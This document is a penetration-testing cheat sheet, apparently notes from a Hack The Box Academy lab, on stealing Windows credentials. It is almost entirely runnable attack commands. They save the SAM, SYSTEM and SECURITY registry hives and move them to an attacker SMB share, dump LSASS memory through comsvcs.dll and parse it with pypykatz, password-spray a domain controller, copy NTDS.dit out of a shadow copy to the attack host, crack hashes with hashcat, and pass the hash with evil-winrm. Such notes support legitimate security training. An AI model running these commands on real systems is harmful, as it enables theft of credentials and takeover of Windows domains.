## Attacking SAM
```bash
hklm\sam # Contains the hashes associated with local account passwords.
hklm\system # Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
hklm\security # Contains cached credentials for domain accounts and Services Creds
# Copying SAM Registry Hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# move the registrys to attacker machine
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support tmp /tmp # Creating a Share
move sam.save \\10.10.15.16\tmp
move security.save \\10.10.15.16\tmp
move system.save \\10.10.15.16\tmp

# Dumping Hashes with Impacket's secretsdump.py
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Cracking Hashes with Hashcat
sudo vim hashestocrack.txt # store the LM hashes here 
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

# Remote Dumping & LSA Secrets Considerations
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa # Dumping LSA Secrets Remotely (Domains  cached creds + Services creds )
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam # Dumping SAM Remotely
```
## Attacking LSASS
```bash
# 1_ Dumping LSASS Process Memory
## Task Manager Method (if we have GUI-based interactive session): 
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file # C:\Users\loggedonusersdirectory\AppData\Local\Temp

## Rundll32.exe & Comsvcs.dll Method:
### Finding LSASS PID
tasklist /svc # Finding LSASS PID in cmd
Get-Process lsass # Finding LSASS PID in PowerShell
### Creating lsass.dmp using PowerShell 
rundll32 "C:\windows\system32\comsvcs.dll", MiniDump <PID> C:\lsass.dmp full # AV tools recognize this as malicious

# 2_ Using Pypykatz to Extract Credentials:
pypykatz lsa minidump /home/peter/Documents/lsass.dmp # Using Pypykatz to Extract Credentials
# [MSV] is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database, Pypykatz extracted the (SID, Username, Domain, and even the NT & SHA1) password hashes associated with the bob user account's logon session stored in LSASS process memory.
# [WDIGEST] is an older authentication protocol enabled by default in Windows XP,Windows 8 and Windows Server 2003 - Windows Server 2012, SASS caches credentials used by WDIGEST in clear-text,Modern Windows operating systems have WDIGEST disabled by default.
# [Kerberos] is a network authentication protocol used by Active Directory in Windows Domain environments,LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos
# [DPAPI] is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications,Mimikatz and Pypykatz can extract the DPAPI `masterkey` for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts

# 3_ Cracking the NT Hash with Hashcat:
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Attacking Active Directory & NTDS.dit
```bash 
### search for usernames 

    # Common username conventions (example: Jane Jill Doe)
    jdoe         # first initial + last name
    jjdoe        # first + middle initial + last name
    janedoe      # first name + last name
    jane.doe     # first name dot last name
    doe.jane     # last name dot first name
    doedoehacksstuff  # nickname or custom alias
    
    # google dorks: “@inlanefreight.com” 
    # “inlanefreight.com filetype:pdf” | exiftool file.pdf (search for Author)

### Creating a Custom list of Usernames
    echo "Ben Williamson" >> names.txt
    ./username-anarchy -i /home/ltnbob/names.txt > usernames.txt

###  Launching the Attack with CrackMapExec
    crackmapexec smb 10.129.201.57 -u <username> -p /usr/share/wordlists/fasttrack.txt

###  Connecting to a DC with Evil-WinRM
    evil-winrm -i 10.129.201.57  -u <user> -p '<password>'

### Checking Local Group Membership
    net localgroup  # *Administrators

### Checking User Account Privileges including Domain
    net user <user> # Global Group memberships: *Domain Users *Domain Admins
[+] # This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file

###  Creating Shadow Copy of C:
    vssadmin CREATE SHADOW /For=C: # Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

###  Copying NTDS.dit from the VSS 
    cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit # copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

###  Transferring NTDS.dit to Attack Host
    cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\<shared_folder>
    
    reg.exe save hklm\system C:\system.save 
    cmd.exe /c move C:\system.save \\10.10.15.30\<shared_folder> # move the system registry too
### Extracting hashes from NTDS.dit
    secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt

### A Faster Method: Using cme to Capture NTDS.dit
    crackmapexec smb 10.129.201.57 -u <username> -p P@55w0rd! --ntds

###  Cracking a Single Hash with Hashcat
    sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

[?] # What if we are unsuccessful in cracking a hash? => pass the hash attack

### Pass-the-Hash Considerations    
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"

```